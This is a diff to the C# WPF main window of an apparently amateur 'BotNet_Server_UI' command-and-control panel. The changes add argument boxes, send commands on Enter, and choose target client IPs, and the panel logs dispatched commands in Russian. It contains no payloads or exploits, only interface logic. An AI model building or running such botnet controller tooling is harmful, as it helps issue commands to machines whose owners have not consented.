@@ -15,7 +15,10 @@ namespace BotNet_Server_UI
     /// </summary>
     public partial class MainWindow : Window
     {
-        public bool ips;
+        public bool ipsall;
+        public string[] ips;
+        TextBox[] args = new TextBox[0];
+
         List<TextBox> textBoxes = new List<TextBox>();
         public MainWindow()
         {
@@ -31,12 +34,19 @@ namespace BotNet_Server_UI
             }
             try
             {
+                string showcommand = Command.Text;
+                string command = Command.Text;
+                for (int i = 0; i < args.Length; i++)
+                {
+                    showcommand += " " + args[i].Text;
+                    command += "^" + args[i].Text;
+                }
                 Message message = new Message()
                 {
-                    command = Command.Text,
-                    ip = ips ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : new string[Convert.ToInt32(IPCount.Content.ToString())]
+                    command = command,
+                    ip = ipsall ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : ips ?? new string[Convert.ToInt32(IPCount.Content.ToString())]
                 };
-                if (!ips)
+                if (!ipsall && ips == null)
                 {
                     for (int i = 0; i < message.ip.Length; i++)
                     {
@@ -44,7 +54,7 @@ namespace BotNet_Server_UI
                     }
                 }
                 Uri res = await ApiRequest.CreateProductAsync(message, "messages");
-                LogPanel.Text += $"Команда {message.command} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages")}) отправлена.\n";
+                LogPanel.Text += $"Команда {showcommand} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages") - 1}) отправлена.\n";
             }
             catch (Exception ex)
             {
@@ -59,12 +69,9 @@ namespace BotNet_Server_UI
 
         private void Command_KeyDown(object sender, KeyEventArgs e)
         {
-            for (int i = 0; i < Commands.commands.Length; i++)
+            if (e.Key == Key.Enter)
             {
-                if (Command.Text == Commands.commands[i])
-                {
-                    Arguments.arguments[i].
-                }
+                Send_Command();
             }
         }
 
@@ -203,7 +210,7 @@ namespace BotNet_Server_UI
                             vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1);
                         }
                     }
-                    if (vars.Count != responses.Length) //fix
+                    if (vars.Count != responses.Length)
                     {
                         for (int i = vars.Count; i < responses.Length; i++)
                         {
@@ -232,11 +239,6 @@ namespace BotNet_Server_UI
             }
         }
 
-        private void Size_Changed(object sender, SizeChangedEventArgs e)
-        {
-
-        }
-
         public void BlockTextIP()
         {
             Button_Minus.IsEnabled = false;
@@ -260,6 +262,36 @@ namespace BotNet_Server_UI
         {
             IPSet iPSet = new IPSet();
             iPSet.Show();
+        }
+        private void Command_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            for (int i = 0; i < Arguments.arguments.Length; i++)
+            {
+                if (Command.Text == Arguments.arguments[i].Command)
+                {
+                    args = new TextBox[Arguments.arguments[i].ArgumentCount];
+                    for (int j = 0; j < Arguments.arguments[i].ArgumentCount; j++)
+                    {
+                        args[j] = new TextBox()
+                        {
+                            Name = $"Argument{j + 1}",
+                            TextWrapping = TextWrapping.Wrap,
+                            VerticalAlignment = VerticalAlignment.Bottom,
+                            HorizontalAlignment = HorizontalAlignment.Left,
+                            Height = 22,
+                            Width = 270 / Arguments.arguments[i].ArgumentCount,
+                            Margin = new Thickness(151 + j * (270 / Arguments.arguments[i].ArgumentCount), Application.Current.Windows[0].Height - 80, Application.Current.Windows[0].Height - (151 + (Arguments.arguments[i].ArgumentCount - 1) * (270 / Arguments.arguments[i].ArgumentCount)), 11)
+                        };
+                        Grid.Children.Add(args[j]);
+                        args[j].KeyDown += Command_KeyDown;
+                    }
+                    return;
+                }
+            }
+            for (int i = 0; i < args.Length; i++)
+            {
+                Grid.Children.Remove(args[i]);
+            }
         }
     }
 }
